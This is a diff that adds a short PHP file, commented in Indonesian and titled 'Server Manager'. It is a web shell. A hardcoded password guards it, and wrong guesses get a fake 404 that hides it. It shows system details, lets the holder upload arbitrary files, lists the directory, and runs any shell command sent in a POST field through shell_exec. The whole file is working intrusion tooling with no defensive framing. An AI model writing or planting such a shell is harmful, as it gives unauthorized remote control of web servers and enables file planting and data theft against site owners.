@@ -1,0 +1,45 @@
+<?php
+// Password sederhana untuk akses script ini
+$password = "bossqu123"; 
+
+if (!isset($_GET['p']) || $_GET['p'] !== $password) {
+    header("HTTP/1.1 404 Not Found");
+    exit("Gak bisa diakses bossqu");
+}
+
+echo "<h3>Server Manager: " . php_uname() . "</h3>";
+echo "<h4>Current Path: " . getcwd() . "</h4>";
+
+// --- FUNGSI UPLOAD ---
+echo '<form enctype="multipart/form-data" method="POST">
+      Upload File: <input type="file" name="file">
+      <input type="submit" value="Upload">
+      </form>';
+
+if(isset($_FILES['file'])) {
+    if(move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
+        echo "<b style='color:green'>Upload Berhasil!</b>";
+    } else {
+        echo "<b style='color:red'>Upload Gagal.</b>";
+    }
+}
+
+// --- FUNGSI CRUD (Lihat File) ---
+$files = scandir('.');
+echo "<ul>";
+foreach($files as $file) {
+    echo "<li>$file</li>";
+}
+echo "</ul>";
+
+// --- FUNGSI TERMINAL (Hanya jika exec aktif) ---
+if(isset($_POST['cmd'])) {
+    echo "<pre>";
+    echo shell_exec($_POST['cmd']);
+    echo "</pre>";
+}
+echo '<form method="POST">
+      Terminal: <input type="text" name="cmd" style="width:300px">
+      <input type="submit" value="Hajar">
+      </form>';
+?>
